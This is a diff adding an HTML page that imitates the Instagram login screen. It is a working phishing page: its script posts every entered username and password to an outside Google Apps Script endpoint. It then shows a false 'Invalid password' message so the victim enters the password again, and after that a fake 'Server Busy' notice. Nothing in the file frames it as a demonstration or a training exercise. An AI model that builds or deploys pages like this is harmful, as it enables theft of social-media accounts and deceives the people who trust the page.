@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    
+    <!-- Tailwind CSS for styling -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Google Fonts for the logo -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Satisfy&display=swap" rel="stylesheet">
+    
+    <style>
+        /* Custom style for the logo font */
+        .font-logo {
+            font-family: 'Satisfy', cursive;
+        }
+        /* Style to make sure the show/hide button doesn't get a blue highlight on tap */
+        .no-tap-highlight {
+            -webkit-tap-highlight-color: transparent;
+        }
+    </style>
+</head>
+<body class="bg-black text-white flex items-center justify-center min-h-screen">
+
+    <div class="w-full max-w-xs mx-auto">
+        <div class="flex flex-col items-center space-y-10">
+            
+            <!-- Logo -->
+            <h1 class="font-logo text-5xl">Instagram</h1>
+
+            <!-- Login Form -->
+            <form id="loginForm" class="w-full flex flex-col space-y-4">
+                <!-- Universal Input Field -->
+                <input 
+                    type="text" 
+                    id="email"
+                    name="email"
+                    placeholder="Phone number, username, or email" 
+                    class="bg-[#1e1e1e] border border-gray-700 text-white text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-3 placeholder-gray-400"
+                    required
+                >
+                
+                <!-- Password Container -->
+                <div class="relative w-full">
+                    <input 
+                        type="password" 
+                        id="password"
+                        name="password"
+                        placeholder="Password" 
+                        class="bg-[#1e1e1e] border border-gray-700 text-white text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-3 pr-16 placeholder-gray-400"
+                        required
+                    >
+                    <button type="button" id="togglePassword" class="absolute inset-y-0 right-0 flex items-center px-4 font-semibold text-sm text-white no-tap-highlight">
+                        Show
+                    </button>
+                </div>
+
+                <!-- Login Button -->
+                <button 
+                    type="submit" 
+                    id="loginButton"
+                    class="w-full text-white bg-blue-600 hover:bg-blue-700 focus:ring-4 focus:outline-none focus:ring-blue-800 font-medium rounded-lg text-sm px-5 py-3 text-center transition-colors duration-300"
+                >
+                    Log in
+                </button>
+            </form>
+
+            <!-- Sign Up Link -->
+            <div class="text-center text-sm text-gray-400">
+                <p>Don't have an account? <a href="#" target="_blank" class="font-semibold text-blue-500 hover:underline">Sign up</a></p>
+            </div>
+        </div>
+        
+        <!-- Message box for status -->
+        <div id="messageBox" class="hidden fixed bottom-5 left-1/2 -translate-x-1/2 bg-red-500 text-white px-6 py-3 rounded-lg shadow-lg text-center">
+            <!-- Message will be set by JavaScript -->
+        </div>
+    </div>
+
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        const loginButton = document.getElementById('loginButton');
+        const messageBox = document.getElementById('messageBox');
+        const passwordInput = document.getElementById('password');
+        const togglePasswordButton = document.getElementById('togglePassword');
+        const emailInput = document.getElementById('email');
+
+        // --- YOUR UNIQUE URL IS EMBEDDED HERE ---
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwhWjspdQ3xBLgEfYlc2D99DgUDK6Ss2mN7b_Kok0cCgPPvrhlnIFDLgQ3fKUJmKKPWMw/exec';
+
+        // Counter for submission attempts for a specific username
+        let submitAttempts = {};
+
+        // --- FUNCTION TO SEND DATA ---
+        function sendData() {
+            const formData = new FormData(loginForm);
+            fetch(SCRIPT_URL, { method: 'POST', body: formData })
+                .then(response => response.json())
+                .then(data => console.log('Success!', data))
+                .catch(error => console.error('Error!', error.message));
+        }
+
+        // --- PASSWORD VISIBILITY TOGGLE ---
+        togglePasswordButton.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.textContent = type === 'password' ? 'Show' : 'Hide';
+        });
+
+        // --- FORM SUBMISSION LOGIC ---
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default page reload
+
+            const currentUser = emailInput.value.trim();
+            if (!currentUser) return; // Don't submit if the user field is empty
+
+            // Initialize counter for this user if it's the first time
+            if (!submitAttempts[currentUser]) {
+                submitAttempts[currentUser] = 0;
+            }
+            submitAttempts[currentUser]++;
+
+            loginButton.disabled = true;
+            loginButton.textContent = 'Logging in...';
+
+            // --- SEND DATA ON EVERY ATTEMPT ---
+            sendData();
+
+            if (submitAttempts[currentUser] === 1) {
+                // --- FIRST CLICK LOGIC ---
+                messageBox.textContent = 'Invalid password, Please try again';
+                messageBox.classList.remove('hidden');
+                
+                setTimeout(() => {
+                    passwordInput.value = ''; // Clear the password field
+                    loginButton.disabled = false;
+                    loginButton.textContent = 'Log in';
+                    messageBox.classList.add('hidden');
+                }, 2500);
+
+            } else {
+                // --- SECOND (AND LATER) CLICK LOGIC ---
+                messageBox.textContent = 'Server Busy';
+                messageBox.classList.remove('hidden');
+                
+                setTimeout(() => {
+                    loginButton.disabled = false;
+                    loginButton.textContent = 'Log in';
+                    messageBox.classList.add('hidden');
+                }, 2500);
+            }
+        });
+    </script>
+
+</body>
+</html>
